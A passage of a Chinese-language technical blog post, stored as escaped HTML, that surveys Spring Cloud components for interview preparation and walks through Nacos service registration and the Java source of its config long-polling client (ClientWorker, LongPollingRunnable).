class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">canPass</span><span class=\"params\">(Node node, <span class=\"type\">int</span> acquireCount, <span class=\"type\">boolean</span> prioritized)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">passQps</span> <span class=\"operator\">=</span> (<span class=\"type\">long</span>) node.passQps();</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">previousQps</span> <span class=\"operator\">=</span> (<span class=\"type\">long</span>) node.previousPassQps();</span><br><span class=\"line\">    syncToken(previousQps);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">// 开始计算它的斜率</span></span><br><span class=\"line\">    <span class=\"comment\">// 如果进入了警戒线，开始调整他的qps</span></span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">restToken</span> <span class=\"operator\">=</span> storedTokens.get();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (restToken &gt;= warningToken) &#123;</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">aboveToken</span> <span class=\"operator\">=</span> restToken - warningToken;</span><br><span class=\"line\">        <span class=\"comment\">// 消耗的速度要比warning快，但是要比慢</span></span><br><span class=\"line\">        <span class=\"comment\">// current interval = restToken*slope+1/count</span></span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">warningQps</span> <span class=\"operator\">=</span> Math.nextUp(<span class=\"number\">1.0</span> / (aboveToken * slope + <span class=\"number\">1.0</span> / count));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (passQps + acquireCount &lt;= warningQps) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (passQps + acquireCount &lt;= count) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ul>\n","cover":"/img/haibian.png","cover_type":"img","excerpt":"","more":"<p>Spring Cloud是一系列框架的有序集合。它利用Spring Boot的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、智能路由、消息总线、负载均衡、断路器、数据监控等，都可以用Spring Boot的开发风格做到一键启动和部署。</p>\n<p>Spring Cloud并没有重复制造轮子，它只是将各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过Spring Boot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。</p>\n<h2 id=\"服务注册与发现\"><a href=\"#服务注册与发现\" class=\"headerlink\" title=\"服务注册与发现\"></a>服务注册与发现</h2><h3 id=\"eureka\"><a href=\"#eureka\" class=\"headerlink\" title=\"eureka\"></a>eureka</h3><p>服务治理组件，包括服务端的注册中心和客户端的服务发现机制；</p>\n<h3 id=\"consul\"><a href=\"#consul\" class=\"headerlink\" title=\"consul\"></a>consul</h3><p>基于Hashicorp Consul的服务治理组件。</p>\n<h2 id=\"服务负载与均衡\"><a href=\"#服务负载与均衡\" class=\"headerlink\" title=\"服务负载与均衡\"></a>服务负载与均衡</h2><h3 id=\"ribbon\"><a href=\"#ribbon\" class=\"headerlink\" title=\"ribbon\"></a>ribbon</h3><p>负载均衡的服务调用组件，具有多种负载均衡调用策略；</p>\n<h3 id=\"loadbalancer\"><a href=\"#loadbalancer\" class=\"headerlink\" title=\"loadbalancer\"></a>loadbalancer</h3><h2 id=\"服务负载与调用\"><a href=\"#服务负载与调用\" class=\"headerlink\" title=\"服务负载与调用\"></a>服务负载与调用</h2><h3 id=\"feign\"><a href=\"#feign\" class=\"headerlink\" title=\"feign\"></a>feign</h3><p>基于Ribbon和Hystrix的声明式服务调用组件；</p>\n<h3 id=\"openFeign\"><a href=\"#openFeign\" class=\"headerlink\" title=\"openFeign\"></a>openFeign</h3><p>基于Ribbon和Hystrix的声明式服务调用组件，可以动态创建基于Spring MVC注解的接口实现用于服务调用，在Spring Cloud 2.0中已经取代Feign成为了一等公民。</p>\n<h2 id=\"服务熔断与降级\"><a href=\"#服务熔断与降级\" class=\"headerlink\" title=\"服务熔断与降级\"></a>服务熔断与降级</h2><h3 id=\"hystrix\"><a href=\"#hystrix\" class=\"headerlink\" title=\"hystrix\"></a>hystrix</h3><p>服务容错组件，实现了断路器模式，为依赖服务的出错和延迟提供了容错能力；</p>\n<h3 id=\"resilience4j\"><a href=\"#resilience4j\" class=\"headerlink\" title=\"resilience4j\"></a>resilience4j</h3><h2 id=\"服务网关\"><a href=\"#服务网关\" class=\"headerlink\" title=\"服务网关\"></a>服务网关</h2><h3 id=\"zuul\"><a href=\"#zuul\" class=\"headerlink\" title=\"zuul\"></a>zuul</h3><p>API网关组件，对请求提供路由及过滤功能。</p>\n<h3 id=\"zuul2\"><a href=\"#zuul2\" class=\"headerlink\" title=\"zuul2\"></a>zuul2</h3><h3 id=\"getway\"><a href=\"#getway\" class=\"headerlink\" title=\"getway\"></a>getway</h3><p>API网关组件，对请求提供路由及过滤功能。</p>\n<h2 id=\"服务分布式配置\"><a href=\"#服务分布式配置\" class=\"headerlink\" title=\"服务分布式配置\"></a>服务分布式配置</h2><h3 id=\"springcloud-config\"><a href=\"#springcloud-config\" class=\"headerlink\" title=\"springcloud config\"></a>springcloud config</h3><p>集中配置管理工具，分布式系统中统一的外部配置管理，默认使用Git来存储配置，可以支持客户端配置的刷新及加密、解密操作。</p>\n<h3 id=\"Nacos\"><a href=\"#Nacos\" class=\"headerlink\" title=\"Nacos\"></a>Nacos</h3><h2 id=\"总线\"><a href=\"#总线\" class=\"headerlink\" title=\"总线\"></a>总线</h2><h3 id=\"Spring-Cloud-Bus\"><a href=\"#Spring-Cloud-Bus\" class=\"headerlink\" title=\"Spring Cloud Bus\"></a>Spring Cloud Bus</h3><p>用于传播集群状态变化的消息总线，使用轻量级消息代理链接分布式系统中的节点，可以用来动态刷新集群中的服务配置。</p>\n<h1 id=\"springcloudAlibaba\"><a href=\"#springcloudAlibaba\" class=\"headerlink\" title=\"springcloudAlibaba\"></a>springcloudAlibaba</h1><h2 id=\"Nacos-1\"><a href=\"#Nacos-1\" class=\"headerlink\" title=\"Nacos\"></a>Nacos</h2><p>Nacos 是一个开源的分布式系统服务发现、配置管理和服务管理平台。它主要包含以下功能：</p>\n<p>服务发现与注册：Nacos 可以管理服务的注册和发现，支持 DNS 和 HTTP&#x2F;RESTful 方式。<br>配置管理：Nacos 可以动态管理配置，支持多种数据类型和版本控制。<br>服务管理：Nacos 可以对服务进行健康检查、流量管理、负载均衡等。</p>\n<h3 id=\"服务发现与注册\"><a href=\"#服务发现与注册\" class=\"headerlink\" title=\"服务发现与注册\"></a>服务发现与注册</h3><p>Nacos 实现服务发现和注册的核心代码位于 nacos&#x2F;naming 目录下，包括以下文件：</p>\n<ul>\n<li>naming-common&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;api&#x2F;naming: 定义了服务发现和注册的 API 接口和数据模型。</li>\n<li>naming-core&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;naming: 实现了服务发现和注册的核心逻辑。</li>\n<li>naming-impl&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;naming: 实现了服务发现和注册的具体实现。</li>\n</ul>\n<p>下面简单介绍一下 Nacos 的服务发现和注册的实现流程。</p>\n<h4 id=\"服务注册流程\"><a href=\"#服务注册流程\" class=\"headerlink\" title=\"服务注册流程\"></a>服务注册流程</h4><p>服务提供者向 Nacos 注册服务时，会调用 NamingService.registerInstance() 方法，该方法会做以下几件事情：</p>\n<ol>\n<li>将服务实例的元数据封装为 Instance 对象，包括服务名、IP、端口号、健康状态、元数据等。</li>\n<li>将 Instance 对象转换为 InstanceEntity 对象，包含了实例 ID 和实例元数据的 JSON 字符串。</li>\n<li>将 InstanceEntity 对象存储到 Nacos 中，可以存储到内存中或者持久化到磁盘中。</li>\n</ol>\n<h4 id=\"服务发现流程\"><a href=\"#服务发现流程\" class=\"headerlink\" title=\"服务发现流程\"></a>服务发现流程</h4><p>服务消费者向 Nacos 发现服务时，会调用 NamingService.getAllInstances() 或 NamingService.selectInstances() 方法，该方法会做以下几件事情：</p>\n<ol>\n<li>从 Nacos 中获取服务实例的元数据，包括服务名、IP、端口号、健康状态、元数据等。</li>\n<li>将元数据封装为 Instance 对象，存储到本地缓存中。</li>\n<li>根据负载均衡算法选择一个服务实例处理请求，可以选择轮询、随机、权重等算法。</li>\n</ol>\n<p>服务发现和注册的核心逻辑在 naming-core 目录下的 com.alibaba.nacos.naming 包中实现，主要包括以下类：</p>\n<ul>\n<li>com.alibaba.nacos.naming.core.InstancesManager: 维护服务实例的元数据和状态信息。</li>\n<li>com.alibaba.nacos.naming.core.Cluster: 维护一个服务的所有实例信息和负载均衡策略。</li>\n<li>com.alibaba.nacos.naming.core.InstanceOperator: 实现了服务实例的注册、注销和更新操作。</li>\n<li>com.alibaba.nacos.naming.core.DomainsManager: 维护多个服务的信息，包括服务名、集群名、命名空间等。</li>\n</ul>\n<p>服务发现和注册的具体实现在 naming-impl 目录下的 com.alibaba.nacos.naming 包中，主要包括以下类：</p>\n<ul>\n<li>com.alibaba.nacos.naming.push.PushService: 实现了服务实例的推送功能。</li>\n<li>com.alibaba.nacos.naming.healthcheck.HealthCheckProcessor: 实现了服务实例的健康检查功能。</li>\n<li>com.alibaba.nacos.naming.misc.GlobalConfig: 存储了一些全局配置，例如默认权重值、心跳间隔</li>\n</ul>\n<h3 id=\"配置动态刷新\"><a href=\"#配置动态刷新\" class=\"headerlink\" title=\"配置动态刷新\"></a>配置动态刷新</h3><p>从远端服务器获取变更数据的主要模式有两种：推（push）和拉（pull）。Push 模式简单来说就是服务端主动将数据变更信息推送给客户端，这种模式优点是时效性好，服务端数据发生变更可以立马通知到客户端，但这种模式需要服务端维持与客户端的心跳连接，会增加服务端实现的复杂度，服务端也需要占用更多的资源来维持与客户端的连接。</p>\n<p>而 Pull 模式则是客户端主动去服务器请求数据，例如，每间隔10ms就向服务端发起请求获取数据。显而易见pull模式存在时效性问题。请求的间隔也不太好设置，间隔太短，对服务器请求压力过大。间隔时间过长，那么必然会造成时效性很差。而且如果配置长时间不更新，并且存在大量的客户端就会产生大量无效的pull请求。</p>\n<p>Nacos 没有采用上述的两种模式，而是采用了长轮询方式结合了推和拉的优点：</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/1.png\" alt=\"动态刷新图\"></p>\n<p>长轮询也是轮询，因此 Nacos 客户端会默认每10ms向服务端发起请求，当客户端请求服务端时会在请求头上携带长轮询的超时时间，默认是30s。而服务端接收到该请求时会hang住请求，为了防止客户端超时会在请求头携带的超时时间上减去500ms，因此默认会hang住请求29.5s。在这期间如果服务端发生了配置变更会产生相应的事件，监听到该事件后，会响应对应的客户端。这样一来客户端不会频繁发起轮询请求，而服务端也不需要维持与客户端的心跳，兼备了时效性和复杂度。</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/2.png\" alt=\"长轮询图\"></p>\n<blockquote>\n<p>1.4版本nacos使用Http短连接+长轮询的方式，客户端发起http请求，服务端hold住请求，当配置变更时响应客户端，超时时间30s。<br>2.0版本nacos用gRPC长连接代替了http短连接长轮询。配置同步采用推拉结合的方式。</p>\n</blockquote>\n<h4 id=\"Nacos-Config-长轮询源码剖析\"><a href=\"#Nacos-Config-长轮询源码剖析\" class=\"headerlink\" title=\"Nacos Config 长轮询源码剖析\"></a>Nacos Config 长轮询源码剖析</h4><p>首先，打开 com.alibaba.cloud.nacos.NacosConfigBootstrapConfiguration 这个类，从类名也可以看出该类是Nacos Config的启动配置类，是Nacos Config自动装配的入口。在该类中的 nacosConfigManager 方法实例化了一个 NacosConfigManager 对象，并注册到容器中：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"meta\">@ConditionalOnMissingBean</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> NacosConfigManager <span class=\"title function_\">nacosConfigManager</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">\t\tNacosConfigProperties nacosConfigProperties)</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NacosConfigManager</span>(nacosConfigProperties);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在 NacosConfigManager 的构造器中调用了 createConfigService 方法，这是一个静态方法用来创建 ConfigService 对象的单例。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Compatible with old design,It will be perfected in the future.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> ConfigService <span class=\"title function_\">createConfigService</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">\t\tNacosConfigProperties nacosConfigProperties)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 双重检查锁模式的单例</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (Objects.isNull(service)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">synchronized</span> (NacosConfigManager.class) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (Objects.isNull(service)) &#123;</span><br><span class=\"line\">\t\t\t\t\tservice = NacosFactory.createConfigService(</span><br><span class=\"line\">\t\t\t\t\t\t\tnacosConfigProperties.assembleConfigServiceProperties());</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">catch</span> (NacosException e) &#123;</span><br><span class=\"line\">\t\t\t\tlog.error(e.getMessage());</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NacosConnectionFailureException</span>(</span><br><span class=\"line\">\t\t\t\t\t\tnacosConfigProperties.getServerAddr(), e.getMessage(), e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> service;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ConfigService 的具体实现是 NacosConfigService，在该类的构造器中主要初始化了 HttpAgent 和 ClientWorker 对象。ClientWorker 的构造器中则初始化了几个线程池：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">ClientWorker</span><span class=\"params\">(<span class=\"keyword\">final</span> HttpAgent agent, <span class=\"keyword\">final</span> ConfigFilterChainManager configFilterChainManager,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"keyword\">final</span> Properties properties)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.agent = agent;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.configFilterChainManager = configFilterChainManager;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// Initialize the timeout parameter</span></span><br><span class=\"line\">    init(properties);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 创建具有定时执行功能的单线程池，用于定时执行 checkConfigInfo 方法</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.executor = Executors.newScheduledThreadPool(<span class=\"number\">1</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">ThreadFactory</span>() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> Thread <span class=\"title function_\">newThread</span><span class=\"params\">(Runnable r)</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">Thread</span> <span class=\"variable\">t</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(r);</span><br><span class=\"line\">            t.setName(<span class=\"string\">&quot;com.alibaba.nacos.client.Worker.&quot;</span> + agent.getName());</span><br><span class=\"line\">            t.setDaemon(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 创建具有定时执行功能的且线程数与cpu核数相对应的线程池，用于根据需要动态刷新的配置文件执行 LongPollingRunnable，因此长轮询任务是可以有多个并行的</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.executorService = Executors</span><br><span class=\"line\">            .newScheduledThreadPool(Runtime.getRuntime().availableProcessors(), <span class=\"keyword\">new</span> <span class=\"title class_\">ThreadFactory</span>() &#123;</span><br><span class=\"line\">                <span class=\"meta\">@Override</span></span><br><span class=\"line\">                <span class=\"keyword\">public</span> Thread <span class=\"title function_\">newThread</span><span class=\"params\">(Runnable r)</span> &#123;</span><br><span class=\"line\">                    <span class=\"type\">Thread</span> <span class=\"variable\">t</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(r);</span><br><span class=\"line\">                    t.setName(<span class=\"string\">&quot;com.alibaba.nacos.client.Worker.longPolling.&quot;</span> + agent.getName());</span><br><span class=\"line\">                    t.setDaemon(<span class=\"literal\">true</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            </span><br><span class=\"line\">    <span class=\"comment\">// 每10ms执行一次 checkConfigInfo 方法</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.executor.scheduleWithFixedDelay(<span class=\"keyword\">new</span> <span class=\"title class_\">Runnable</span>() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                checkConfigInfo();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Throwable e) &#123;</span><br><span class=\"line\">                LOGGER.error(<span class=\"string\">&quot;[&quot;</span> + agent.getName() + <span class=\"string\">&quot;] [sub-check] rotate check error&quot;</span>, e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;, <span class=\"number\">1L</span>, <span class=\"number\">10L</span>, TimeUnit.MILLISECONDS);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">init</span><span class=\"params\">(Properties properties)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 长轮询的超时时间，默认为30秒，此参数会被放到请求头中带到服务端，服务端会根据该参数去做长轮询的hold</span></span><br><span class=\"line\">    timeout = Math.max(ConvertUtils.toInt(properties.getProperty(PropertyKeyConst.CONFIG_LONG_POLL_TIMEOUT),</span><br><span class=\"line\">            Constants.CONFIG_LONG_POLL_TIMEOUT), Constants.MIN_CONFIG_LONG_POLL_TIMEOUT);</span><br><span class=\"line\">    </span><br><span class=\"line\">    taskPenaltyTime = ConvertUtils</span><br><span class=\"line\">            .toInt(properties.getProperty(PropertyKeyConst.CONFIG_RETRY_TIME), Constants.CONFIG_RETRY_TIME);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">this</span>.enableRemoteSyncConfig = Boolean</span><br><span class=\"line\">            .parseBoolean(properties.getProperty(PropertyKeyConst.ENABLE_REMOTE_SYNC_CONFIG));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Check config info.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkConfigInfo</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Dispatch taskes.</span></span><br><span class=\"line\">    <span class=\"comment\">// 获取需要监听的文件数量</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">listenerSize</span> <span class=\"operator\">=</span> cacheMap.size();</span><br><span class=\"line\">    <span class=\"comment\">// Round up the longingTaskCount.</span></span><br><span class=\"line\">    <span class=\"comment\">// 默认一个 LongPollingRunnable 可以处理监听3k个配置文件的变化，超过3k个才会创建新的 LongPollingRunnable</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">longingTaskCount</span> <span class=\"operator\">=</span> (<span class=\"type\">int</span>) Math.ceil(listenerSize / ParamUtil.getPerTaskConfigSize());</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (longingTaskCount &gt; currentLongingTaskCount) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> (<span class=\"type\">int</span>) currentLongingTaskCount; i &lt; longingTaskCount; i++) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// The task list is no order.So it maybe has issues when changing.</span></span><br><span class=\"line\">            executorService.execute(<span class=\"keyword\">new</span> <span class=\"title class_\">LongPollingRunnable</span>(i));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        currentLongingTaskCount = longingTaskCount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>LongPollingRunnable 类主要用于检查本地配置，以及长轮询地去服务端获取变更配置的 dataid 和 group，其代码位于 com.alibaba.nacos.client.config.impl.ClientWorker 类，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">LongPollingRunnable</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> taskId;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">LongPollingRunnable</span><span class=\"params\">(<span class=\"type\">int</span> taskId)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.taskId = taskId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        List&lt;CacheData&gt; cacheDatas = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;CacheData&gt;();</span><br><span class=\"line\">        List&lt;String&gt; inInitializingCacheList = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;String&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// check failover config</span></span><br><span class=\"line\">            <span class=\"comment\">// 遍历本地缓存的配置</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (CacheData cacheData : cacheMap.values()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (cacheData.getTaskId() == taskId) &#123;</span><br><span class=\"line\">                    cacheDatas.add(cacheData);</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 检查本地配置</span></span><br><span class=\"line\">                        checkLocalConfig(cacheData);</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (cacheData.isUseLocalConfigInfo()) &#123;</span><br><span class=\"line\">                            cacheData.checkListenerMd5();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                        LOGGER.error(<span class=\"string\">&quot;get local config info error&quot;</span>, e);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// check server config</span></span><br><span class=\"line\">            <span class=\"comment\">// 通过长轮询检查服务端配置</span></span><br><span class=\"line\">            List&lt;String&gt; changedGroupKeys = checkUpdateDataIds(cacheDatas, inInitializingCacheList);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!CollectionUtils.isEmpty(changedGroupKeys)) &#123;</span><br><span class=\"line\">                LOGGER.info(<span class=\"string\">&quot;get changedGroupKeys:&quot;</span> + changedGroupKeys);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">for</span> (String groupKey : changedGroupKeys) &#123;</span><br><span class=\"line\">                String[] key = GroupKey.parseKey(groupKey);</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">dataId</span> <span class=\"operator\">=</span> key[<span class=\"number\">0</span>];</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">group</span> <span class=\"operator\">=</span> key[<span class=\"number\">1</span>];</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">tenant</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (key.length == <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">                    tenant = key[<span class=\"number\">2</span>];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    String[] ct = getServerConfig(dataId, group, tenant, <span class=\"number\">3000L</span>);</span><br><span class=\"line\">                    <span class=\"type\">CacheData</span> <span class=\"variable\">cache</span> <span class=\"operator\">=</span> cacheMap.get(GroupKey.getKeyTenant(dataId, group, tenant));</span><br><span class=\"line\">                    cache.setContent(ct[<span class=\"number\">0</span>]);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"literal\">null</span> != ct[<span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">                        cache.setType(ct[<span class=\"number\">1</span>]);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    LOGGER.info(<span class=\"string\">&quot;[&#123;&#125;] [data-received] dataId=&#123;&#125;, group=&#123;&#125;, tenant=&#123;&#125;, md5=&#123;&#125;, content=&#123;&#125;, type=&#123;&#125;&quot;</span>,</span><br><span class=\"line\">                            agent.getName(), dataId, group, tenant, cache.getMd5(),</span><br><span class=\"line\">                            ContentUtils.truncateContent(ct[<span class=\"number\">0</span>]), ct[<span class=\"number\">1</span>]);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (NacosException ioe) &#123;</span><br><span class=\"line\">                    <span class=\"type\">String</span> <span class=\"variable\">message</span> <span class=\"operator\">=</span> String</span><br><span class=\"line\">                            .format(<span class=\"string\">&quot;[%s] [get-update] get changed config exception. dataId=%s, group=%s, tenant=%s&quot;</span>,</span><br><span class=\"line\">                                    agent.getName(), dataId, group, tenant);</span><br><span class=\"line\">                    LOGGER.error(message, ioe);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (CacheData cacheData : cacheDatas) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!cacheData.isInitializing() || inInitializingCacheList</span><br><span class=\"line\">                        .contains(GroupKey.getKeyTenant(cacheData.dataId, cacheData.group, cacheData.tenant))) &#123;</span><br><span class=\"line\">                    cacheData.checkListenerMd5();</span><br><span class=\"line\">                    cacheData.setInitializing(<span class=\"literal\">false</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            inInitializingCacheList.clear();</span><br><span class=\"line\">            </span><br><span class=\"line\">            executorService.execute(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable e) &#123;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// If the rotation training task is abnormal, the next execution time of the task will be punished</span></span><br><span class=\"line\">            LOGGER.error(<span class=\"string\">&quot;longPolling error : &quot;</span>, e);</span><br><span class=\"line\">            executorService.schedule(<span class=\"built_in\">this</span>, taskPenaltyTime, TimeUnit.MILLISECONDS);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面有个 checkUpdateDataIds 方法，用于获取发生变更了的配置文件的dataId列表，它同样位于 ClientWorker 内。如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Fetch the dataId list from server.</span></span><br><span class=\"line\"><span class=\"comment\"> 